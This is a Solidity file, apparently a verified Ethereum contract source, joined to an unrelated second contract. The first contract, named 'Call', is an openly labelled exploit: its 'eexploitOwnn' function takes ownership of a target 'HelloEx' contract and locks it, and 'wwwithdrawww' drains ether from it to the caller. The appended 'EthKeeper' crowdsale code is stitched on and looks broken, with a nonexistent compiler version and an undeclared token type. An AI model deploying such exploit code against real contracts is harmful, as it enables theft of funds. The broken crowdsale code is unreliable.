/**
 * Source Code first verified at https://etherscan.io on Tuesday, June 19, 2018
 (UTC) */

pragma solidity ^0.4.24;
contract HelloEx{

	function own(address owner) {}

	function releaseFunds(uint amount) {}

	function lock() {}
}

contract Call{

	address owner;

	HelloEx contr;

	constructor() public
	{
		owner = msg.sender;
	}

	function setMyContractt(address addr) public
	{
		require(owner==msg.sender);
		contr = HelloEx(addr);
	}

	function eexploitOwnn() payable public
	{
		require(owner==msg.sender);
		contr.own(address(this));
		contr.lock();
	}

	function wwwithdrawww(uint amount) public
	{
		require(owner==msg.sender);
		contr.releaseFunds(amount);
		msg.sender.transfer(amount * (1 ether));
	}

	function () payable public
	{}
}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010; 
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
 }
